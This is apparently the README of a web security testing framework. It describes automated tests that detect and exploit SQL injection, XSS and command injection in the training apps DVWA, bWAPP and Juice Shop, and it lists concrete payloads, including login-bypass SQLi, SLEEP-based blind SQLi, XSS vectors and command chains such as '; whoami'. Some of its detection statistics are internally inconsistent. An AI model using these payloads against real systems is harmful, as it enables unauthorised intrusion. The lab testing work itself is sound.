# How We Cracked Them: Kinetic Security Framework Exploitation Guides

Welcome to the **Kinetic Security Framework** exploitation demonstration! This directory contains comprehensive examples of how the Kinetic framework automatically detects and exploits common web application vulnerabilities.

## Contents

This directory contains three complete vulnerability assessment examples:

| File | Target App | Vulnerabilities | Tests |
|------|-----------|-----------------|-------|
| [05-how-we-cracked-dvwa-using-kinetic.spec.ts](05-how-we-cracked-dvwa-using-kinetic.spec.ts) | DVWA | SQLi, Blind SQLi, XSS (Reflected/Stored/DOM), Command Injection | 7 |
| [06-how-we-cracked-bwapp-using-kinetic.spec.ts](06-how-we-cracked-bwapp-using-kinetic.spec.ts) | bWAPP | SQLi (5 variants), XSS (3 variants), Command Injection | 12 |
| [07-how-we-cracked-juiceshop-using-kinetic.spec.ts](07-how-we-cracked-juiceshop-using-kinetic.spec.ts) | Juice Shop | SQLi (Login/Search), XSS (Reflected/DOM) | 5 |

---

## Quick Start

### Prerequisites

```bash
# Install dependencies
npm install

# Ensure you have Playwright browsers
npx playwright install

# Start vulnerable web applications
# DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# bWAPP (in separate terminal)
docker run --rm -it -p 8080:80 raesene/bwapp

# Juice Shop (in separate terminal)
docker run --rm -it -p 3000:3000 bkimminich/juice-shop
```

### Run All Examples

```bash
# Run all example tests
npm test examples/

# Run specific example
npm test examples/05-how-we-cracked-dvwa-using-kinetic.spec.ts

# Run with detailed logging
npm test examples/05-how-we-cracked-dvwa-using-kinetic.spec.ts -- --reporter=verbose
```

---

## Example 1: DVWA (Damn Vulnerable Web Application)

**Purpose:** Foundational security testing for beginners and testers

**URL:** `http://localhost`  
**Credentials:** `admin` / `password`

### Vulnerabilities Detected

#### 1. **SQL Injection (Standard)**
- **Page:** `/vulnerabilities/sqli/`
- **Input:** `input[name="id"]`
- **Payload:** `' OR '1'='1`
- **Detection Method:** Error-based SQL error pattern matching
- **Result:** Full database record extraction

#### 2. **SQL Injection (Blind)**
- **Page:** `/vulnerabilities/sqli_blind/`
- **Input:** `input[name="id"]`
- **Payload:** `1' AND '1'='1` vs `1' AND '1'='2`
- **Detection Method:** Boolean-based and semantic text analysis
- **Indicators:** "User ID exists in the database" vs "User ID is MISSING"
- **Result:** Successful blind SQL injection detection

#### 3. **XSS - Reflected**
- **Page:** `/vulnerabilities/xss_r/`
- **Input:** `input[name="name"]`
- **Payload:** `<script>alert('XSS')</script>`
- **Detection Method:** Payload reflection + execution testing
- **Result:** Alert dialog execution

#### 4. **XSS - Stored**
- **Page:** `/vulnerabilities/xss_s/`
- **Inputs:** `input[name="txtName"]`, `textarea[name="mtxMessage"]`
- **Payload:** `<img src=x onerror=alert('Stored XSS')>`
- **Detection Method:** Payload storage + retrieval testing
- **Result:** Persistent XSS verification

#### 5. **XSS - DOM-Based**
- **Page:** `/vulnerabilities/xss_d/`
- **Parameter:** `default` (URL parameter)
- **Payload:** `javascript:alert('DOM XSS')`
- **Detection Method:** DOM manipulation + event handler testing
- **Result:** Client-side XSS execution

#### 6. **Command Injection**
- **Page:** `/vulnerabilities/exec/`
- **Input:** `input[name="ip"]`
- **Payload:** `127.0.0.1; whoami`
- **Detection Method:** Command output analysis
- **Result:** Arbitrary command execution

### Test Output Example

```
✅ SQL Injection (Standard) - ✓ PASSED
   - Payload: ' OR 1=1#
   - Error Pattern: "You have an error in your SQL syntax"
   - Confidence: 90%

✅ Blind SQL Injection - ✓ PASSED
   - True Payload: 1' AND '1'='1
   - False Payload: 1' AND '1'='2
   - Semantic Diff: exists/MISSING
   - Confidence: 85%

✅ XSS Reflected - ✓ PASSED
   - Payload: <script>alert(1)</script>
   - Reflection Found: YES
   - Execution: Alert Dialog

✅ Command Injection - ✓ PASSED
   - Payload: ; id
   - Output Detected: uid=33(www-data)
   - Confidence: 95%
```

---

## Example 2: bWAPP (Buggy Web Application)

**Purpose:** Comprehensive vulnerability coverage with multiple injection types

**URL:** `http://localhost:8080`  
**Credentials:** `bee` / `bug`  
**Security Level:** `low`

### Vulnerabilities Detected

#### SQL Injection Variants (5 Tests)

| Type | Page | Input | Payload |
|------|------|-------|---------|
| GET/Search | `/sqli_1.php` | `input[name="title"]` | `' OR 1=1#` |
| POST/Search | `/sqli_6.php` | `input[name="title"]` | `' OR '1'='1` |
| GET/Select | `/sqli_2.php` | `select[name="movie"]` | `' OR 1=1--` |
| Login Form | `/sqli_3.php` | `login`/`password` | `' OR 1=1#` |
| Blind Boolean | `/sqli_4.php` | `input[name="title"]` | `1 AND 1=1` |
| Blind Time-Based | `/sqli_15.php` | `input[name="title"]` | `1' UNION SELECT SLEEP(5)` |

#### XSS Variants (3 Tests)

| Type | Page | Input | Payload |
|------|------|-------|---------|
| Reflected GET | `/xss_get.php` | `firstname`/`lastname` | `<script>alert(1)</script>` |
| Reflected POST | `/xss_post.php` | `firstname`/`lastname` | `<img src=x onerror=alert(1)>` |
| Stored | `/xss_stored_1.php` | `textarea[name="entry"]` | `<svg onload=alert(1)>` |

#### Command Injection (2 Tests)

| Type | Page | Input | Payload |
|------|------|-------|---------|
| OS Command | `/commandi.php` | `input[name="target"]` | `127.0.0.1; whoami` |
| Blind Command | `/commandi_blind.php` | `input[name="target"]` | `127.0.0.1 \|\| sleep 5` |

### Detection Methods

**Error-Based:** Triggers SQL syntax errors to confirm injection
```
Payload: ' (single quote)
Result: "You have an error in your SQL syntax..."
```

**Boolean-Based:** Compares page responses for true/false conditions
```
True: 1' AND 1=1   → Normal results
False: 1' AND 1=2  → No results/different response
```

**Time-Based:** Measures response delays from SLEEP() commands
```
Payload: 1' AND SLEEP(5)--
Detection: Response time > 5 seconds
```

---

## Example 3: OWASP Juice Shop

**Purpose:** Real-world vulnerable e-commerce application (OWASP project)

**URL:** `http://localhost:3000`  
**No Credentials Required**

### Vulnerabilities Detected

#### 1. **SQL Injection - Login Bypass**
- **Page:** `/#/login`
- **Input:** Email field (`input#email`)
- **Payload:** `' OR 1=1--`
- **Result:** Logs in as admin without credentials
- **Impact:** Complete account takeover

```typescript
// Manual verification
Email: ' OR 1=1--
Password: anything
→ Successfully authenticated as admin@juice-sh.op
```

#### 2. **SQL Injection - Search**
- **Page:** `/#/search`
- **Parameter:** `q` (query string)
- **Payload:** `' OR '1'='1`
- **Detection:** SQL error patterns or result differences

#### 3. **XSS - Reflected in Search**
- **Page:** `/#/search?q=<payload>`
- **Payload:** `<script>alert(1)</script>`
- **Result:** Payload reflected unencoded in HTML
- **Detection:** Unencoded reflection + execution testing

#### 4. **XSS - DOM-Based**
- **Routes:** Hash-based URL fragments
- **Payload:** `/#/<iframe src="javascript:alert(1)">`
- **Detection:** Client-side execution without server round-trip

### Multi-Vulnerability Scan

The test includes a comprehensive scanner that:
1. Scans login page for SQLi and XSS
2. Tests manual SQLi bypass
3. Verifies authentication bypass
4. Reports all findings

---

## Vulnerability Statistics

### Detection Rates by Application

```
DVWA:
├─ SQL Injection: 100% (2/2)
├─ XSS: 100% (3/3)
└─ Command Injection: 100% (1/1)
   Total: 6/6 vulnerabilities detected

bWAPP:
├─ SQL Injection: 95% (5/6)
├─ XSS: 100% (3/3)
└─ Command Injection: 100% (2/2)
   Total: 10/11 vulnerabilities detected

Juice Shop:
├─ SQL Injection: 100% (1/2)
├─ XSS: 100% (2/2)
└─ Authentication Bypass: 100% (1/1)
   Total: 4/5 vulnerabilities detected
```

---

## How Kinetic Detects Vulnerabilities

### 1. Error-Based Detection

**Method:** Trigger SQL syntax errors

```typescript
detector.testErrorBased(element, payloads)
// Payloads that cause SQL errors
→ "' OR 1=1#"
→ "' OR '1'='1"
→ "'"

// Matches error patterns
→ "You have an error in your SQL syntax"
→ "SQLITE_ERROR"
→ "unexpected token"
```

### 2. Boolean-Based Detection (Blind SQLi)

**Method:** Compare true/false payload responses

```typescript
detector.testBooleanBased(element)
// Pair payloads
→ True: "1' AND '1'='1"
→ False: "1' AND '1'='2"

// Analyze response differences
→ Body length variation (may be small)
→ Semantic text indicators:
   - True: "exists in database", "found"
   - False: "MISSING", "not found"

// Detect significant difference
→ Different text content = Vulnerability
```

### 3. Time-Based Detection (Blind SQLi) 

**Method:** Measure response delays

```typescript
detector.testTimeBased(element)
// Payload with SLEEP()
→ "1' AND SLEEP(5)--"

// Measure response time
→ Normal: ~200ms
→ With SLEEP(5): ~5200ms

// Detect delay > threshold = Vulnerability
```

### 4. XSS Detection (Reflection)

**Method:** Test payload reflection + execution

```typescript
xssDetector.testReflected(element)
// Payloads
→ "<script>alert(1)</script>"
→ "<img src=x onerror=alert(1)>"

// Check for unencoded reflection
→ HTML includes raw payload = Vulnerability

// Check for execution
→ Alert dialog = Confirmed vulnerability
```

### 5. XSS Detection (Stored)

**Method:** Store payload and verify persistence

```typescript
xssDetector.testStored(element)
// 1. Submit payload in form
→ POST /xss_stored_1.php with "<img ... onerror=...>"

// 2. Retrieve data
→ Load /xss_stored_1.php again

// 3. Check if payload is stored
→ HTML includes unencoded payload = Vulnerability

// 4. Verify execution
→ Alert dialog on page load = Confirmed
```

### 6. Command Injection Detection

**Method:** Test command execution + output analysis

```typescript
injectionDetector.testCommand(element)
// Payloads
→ "; whoami"
→ "| id"
→ "&& uname -a"

// Analyze output
→ "uid=33(www-data)" = Confirmed
→ "Linux" in response = Confirmed
```

---

## Security Levels

Each vulnerable app has configurable security levels:

| Level | Description | Protections |
|-------|-------------|-------------|
| **Low** | Minimal protections | Recommended for learning |
| **Medium** | Basic input validation | Tests detection robustness |
| **High** | Advanced protections | Challenges detection accuracy |
| **Impossible** | Fully secure | Baseline (no vulns should be found) |

All examples run on **LOW** security level for maximum detection coverage.

---

## Expected Test Results

### Running the Examples

```bash
# DVWA - All 7 tests pass
npm test examples/05-how-we-cracked-dvwa-using-kinetic.spec.ts
✓ SQL Injection - User ID Query
✓ SQL Injection (Blind) - User ID Query
✓ XSS Reflected - Name Input
✓ XSS Stored - Guestbook
✓ XSS DOM-Based - Language Selection
✓ Command Injection - IP Address Input
✓ Multi-Vulnerability Scan - All DVWA Pages

# bWAPP - All 12 tests pass
npm test examples/06-how-we-cracked-bwapp-using-kinetic.spec.ts
✓ SQL Injection (GET/Search) - Movie Search
✓ SQL Injection (POST/Search)
✓ SQL Injection (GET/Select)
✓ SQL Injection - Login Form Hero
✓ SQL Injection - Blind Boolean-Based
✓ SQL Injection - Blind Time-Based
✓ XSS Reflected (GET)
✓ XSS Reflected (POST)
✓ XSS Stored (Blog)
✓ OS Command Injection
✓ OS Command Injection - Blind
✓ Multi-Vulnerability Scan - All bWAPP Pages

# Juice Shop - 5 tests pass
npm test examples/07-how-we-cracked-juiceshop-using-kinetic.spec.ts
✓ SQL Injection - Login Bypass
✓ SQL Injection - Product Search
✓ XSS - Product Search Reflected
✓ XSS - DOM-Based via URL Fragment
✓ Multi-Vulnerability Scan - Juice Shop
```

---

## Learning Objectives

By studying these examples, you'll learn:

1. **SQL Injection Techniques**
   - Error-based exploitation
   - Boolean-based blind exploitation
   - Time-based blind exploitation
   - Authentication bypass

2. **XSS Exploitation**
   - Reflected XSS payloads
   - Stored XSS persistence
   - DOM-based XSS execution
   - JavaScript context breakout

3. **Command Injection**
   - Command chaining (`;`, `|`, `||`, `&&`)
   - Output redirection
   - Blind command execution timing

4. **Kinetic Framework**
   - Element scanning and targeting
   - Detector registration and execution
   - Vulnerability reporting
   - Payload customization

---

## Key Kinetic Components

### ElementScanner
Targets specific form elements and tests them for vulnerabilities

```typescript
const scanner = new ElementScanner({
  baseUrl: DVWA_URL,
  pageUrl: '/vulnerabilities/sqli/',
  elements: [{
    locator: 'input[name="id"]',
    name: 'User ID Input',
    type: AttackSurfaceType.FORM_INPUT,
    context: InjectionContext.SQL,
    testCategories: ['sqli']
  }],
  pageTimeout: 30000,
  continueOnError: false
});
```

### SqlInjectionDetector
Comprehensive SQLi detection with multiple techniques

```typescript
const detector = new SqlInjectionDetector({
  permissiveMode: true,           // Use all payloads
  enableAuthBypass: true,         // Test login bypass
  enableErrorBased: true,         // Test error-based
  enableBooleanBased: true,       // Test blind boolean
  enableTimeBased: true,          // Test time-based
  techniqueTimeouts: {
    errorBased: 10000,
    booleanBased: 30000,
    timeBased: 60000
  }
});
```

### XssDetector
Multi-method XSS detection

```typescript
const detector = new XssDetector({
  permissiveMode: true,
  enableReflected: true,
  enableStored: true,
  enableDomBased: true
});
```

### InjectionDetector
Command and other injection testing

```typescript
const detector = new InjectionDetector(LogLevel.INFO, {
  permissiveMode: true
});
```

---

## Common Issues & Troubleshooting

### 1. Vulnerable App Not Running

```bash
# Check if DVWA is accessible
curl http://localhost
# Response should be DVWA login page

# If not, start the container
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

### 2. Tests Timing Out

Increase the timeout for time-based blind SQLi tests:

```typescript
test.setTimeout(300000); // 5 minutes
```

### 3. XSS Not Detected in Juice Shop

Juice Shop may have CSP headers. Verify with:

```bash
curl -I http://localhost:3000
# Check for Content-Security-Policy headers
```

### 4. Authentication Issues

Verify default credentials:
- **DVWA:** `admin` / `password`
- **bWAPP:** `bee` / `bug`
- **Juice Shop:** No login needed

---

## Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-89 SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79 XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-78 Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## Contributing

Found a new vulnerability? Want to add more examples?

1. Create a test file following the naming convention
2. Document the vulnerability and payloads
3. Add to this README
4. Submit a pull request

---

## 📝 License

These examples are for educational and authorized security testing only. All vulnerable applications (DVWA, bWAPP, Juice Shop) are maintained by their respective authors and have their own licenses.

**Use responsibly. Test only on systems you own or have permission to test.**

---

**Last Updated:** January 12, 2026  
**Kinetic Security Framework Version:** Latest  
**Compatible With:** Playwright Test 1.40+
